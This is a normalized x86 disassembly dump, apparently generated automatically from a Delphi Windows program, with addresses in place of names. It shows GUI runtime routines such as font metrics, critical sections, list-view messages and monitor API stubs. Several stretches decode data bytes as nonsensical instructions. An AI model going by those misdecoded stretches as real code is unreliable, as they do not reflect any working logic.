pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bb08
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42bb48
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42936c
mov eax [ ebx + 0x28 ]
call sub_429370
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42bbc8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_42b99c
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41b600
pop esi
pop ebx
retn
sub_42bc18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42bc59
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call sub_42772c
mov ecx esi
mov edx ebx
call sub_4273cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bc60
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_42bc68
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_426070
mov [ rw-data ] eax
pop ebx
retn
sub_42bca0
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_42bce4
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_42bca0
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_42bdb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_42bde8
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_42bfe0
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_42be2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42be14
xor eax eax
push ebp
push sub_42becd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bed4
mov eax [ ebp - 0x4 ]
call sub_42be20
retn
mov eax 0x10
call sub_40276c
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42bee0
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42bee0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42bfbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_42a3dc
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_425090
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_424f74
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41776c
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_425318
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_4256f0
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_42a098
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bfe0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42be14
xor eax eax
push ebp
push sub_42c02b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c032
mov eax [ ebp - 0x4 ]
call sub_42be20
retn
mov esp ebp
pop ebp
retn
sub_42c032
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_40278c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_4031ec
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42be14
xor eax eax
push ebp
push sub_42c02b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c032
mov eax [ ebp - 0x4 ]
call sub_42be20
retn
mov esp ebp
pop ebp
retn
sub_42c058
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_4242e8
push eax
mov eax ebx
call sub_4242e8
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42be2c
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42c090
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c159
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c160
retn
mov eax [ rw-data ]
call sub_4031ec
mov eax [ rw-data ]
call sub_4031ec
mov eax [ rw-data ]
call sub_4031ec
call sub_429050
mov eax [ rw-data ]
call sub_4031ec
mov eax [ rw-data ]
call sub_4031ec
mov eax [ rw-data ]
call sub_4031ec
mov eax [ rw-data ]
call sub_4031ec
mov eax [ rw-data ]
call sub_4031ec
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a04
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404a04
sub_42c164
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42bc68
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_42bce4
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_423aa0
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_423aa0
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_423aa0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bdb0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419030
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419030
mov [ rw-data ] eax
mov ecx sub_4242f8
mov edx sub_424308
mov eax [ sub_422998 ]
call sub_418584
mov ecx r-xdata
mov edx sub_424510
mov eax [ r-xdata ]
call sub_418584
sub_42c270
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c295
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c29c
retn
sub_42c2ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xc3
inc edx
add [ eax + eax ] dl
add [ eax ] al
je r-xdata
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x200042c4 ] bh
sub al [ eax ]
cld
les eax [ edx ]
call 0xc43062d
push esp
dec edi
jb r-xdata
inc ecx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x74 ] cl
inc ecx
add ah ch
lea eax [ ecx ]
xor ah al
inc edx
add [ esp + ecx * 4 - 0x72e7ffbf ] bl
inc ecx
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol bl 0x1
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax ] dl
retn
pop esp
retn
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0xc400408d
retn
mov ecx ebx
mov edx edi
mov eax esi
call sub_41902c
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_4031ec
sub_42c312
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3d ] ch
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x200042c4 ] bh
sub al [ eax ]
cld
les eax [ edx ]
call 0xc43062d
push esp
dec edi
jb r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0xc400408d
retn
mov ecx ebx
mov edx edi
mov eax esi
call sub_41902c
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_4031ec
sub_42c37a
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
retn
sub_42c3d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_42c430
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_41902c
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_4031ec
sub_42c474
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_42c4b8
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_42c4fc
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418cb4
mov eax esi
pop esi
pop ebx
retn
sub_42c528
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c54d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c554
retn
sub_42c568
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42c5c8
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_42c568
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_42c6dc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1003
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42c780
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_406c2c
push eax
push esi
push 0x100c
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42c7b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push edi
push 0x100e
push esi
call SendMessageA
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
push ebx
push edi
push 0x100e
push esi
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_42c800
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1015
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42c848
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x101a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42c8a4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_406c2c
push eax
push esi
push 0x101e
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42c8c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1021
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42c93c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x102a
push ebx
call SendMessageA
test eax eax
setne al
neg al
sbb eax eax
pop esi
pop ebx
retn
sub_42c95c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102b
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42c99c
push ebx
push esi
mov esi edx
mov ebx eax
push 0xf000
push esi
push 0x102c
push ebx
call SendMessageA
shr eax 0xc
dec eax
pop esi
pop ebx
retn
sub_42c9bc
add esp 0xffffffd8
mov [ esp + 0x10 ] 0xf000
and ecx 0x1
inc ecx
shl ecx 0xc
mov [ esp + 0xc ] ecx
mov ecx esp
push ecx
push edx
push 0x102b
push eax
call SendMessageA
add esp 0x28
retn
sub_42c9e8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102e
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42ca38
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1030
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42ca7c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x103a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42ca98
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x103b
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42cab4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1041
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42cb50
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x100a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42cb7c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1012
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42cba8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cbcd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cbd4
retn
sub_42cbe0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40442c
xor eax eax
push ebp
push sub_42cc9f
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cca6
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42cbe0
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f7c
sub_42ccc8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42cbe0
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42cd50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42cbe0
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42cde0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42cbe0
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42cd50
sub_42ce76
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42cbe0
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42cef7
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42cbe0
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42cfe4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42cbe0
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42d0b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42cbe0
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
